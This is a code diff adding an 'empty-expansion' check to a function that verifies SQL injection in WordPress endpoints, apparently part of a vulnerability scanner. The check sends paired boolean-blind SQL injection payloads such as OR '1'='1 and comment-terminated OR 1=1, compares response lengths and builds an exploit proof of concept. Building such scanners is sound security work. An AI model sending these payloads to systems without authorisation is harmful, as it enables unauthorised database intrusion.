@@ -7136,6 +7136,44 @@ def verify_wordpress_sqli(
                 consistent_diffs += 1
         res.evidence["boolean_intentos"] = bool_tried
 
+        # Empty-expansion check: when control is empty (≤5B like [] or {}),
+        # the standard `matches_base` guard filters out OR payloads that do expand.
+        # Detect SQLi by checking if OR 1=1 significantly expands vs OR 1=2.
+        if consistent_diffs < 2 and base_len <= 5:
+            _exp_pairs = [
+                (f"{orig_value}' OR '1'='1", f"{orig_value}' OR '1'='2"),
+                (f"{orig_value} OR 1=1", f"{orig_value} OR 1=2"),
+                (f"{orig_value} OR 1=1-- -", f"{orig_value} OR 1=2-- -"),
+                (f"{orig_value}' OR 1=1-- -", f"{orig_value}' OR 1=2-- -"),
+            ]
+            for _exp_t, _exp_f in _exp_pairs:
+                try:
+                    _rt_exp = send(_exp_t); _rf_exp = send(_exp_f)
+                    _lt_exp = len(_rt_exp.text or ""); _lf_exp = len(_rf_exp.text or "")
+                    if (_lt_exp > 10 and _lf_exp <= 10 and _lt_exp >= 20):
+                        res.verified = True; res.ok = True
+                        res.confidence = "probable"
+                        res.evidence.update({
+                            "tecnica": "boolean-blind-empty-expansion",
+                            "sqli_param": sqli_param, "metodo": m, "endpoint": endpoint,
+                            "true_payload": _exp_t, "false_payload": _exp_f,
+                            "len_true": _lt_exp, "len_false": _lf_exp, "len_control": base_len,
+                        })
+                        res.detail = (
+                            f"SQLI CONFIRMADO (boolean-blind OR-expansion): "
+                            f"OR 1=1 retorno {_lt_exp}B, OR 1=2 retorno {_lf_exp}B "
+                            f"(control={base_len}B) — resultados se expanden con OR 1=1"
+                        )
+                        step(f"VERIFICADO empty-expansion: TRUE={_lt_exp}B FALSE={_lf_exp}B ctrl={base_len}B")
+                        _poc_params = dict(base_params); _poc_params[sqli_param] = _exp_t
+                        res.exploit_poc = _build_exploit_poc(
+                            base_url=boot.base_url, endpoint=endpoint, method=m,
+                            params=_poc_params, json_body=json_body,
+                            technique="boolean-blind SQLi (OR-expansion)")
+                        return res
+                except Exception:
+                    continue
+
         if consistent_diffs >= 2:
             res.verified = True
             res.ok = True
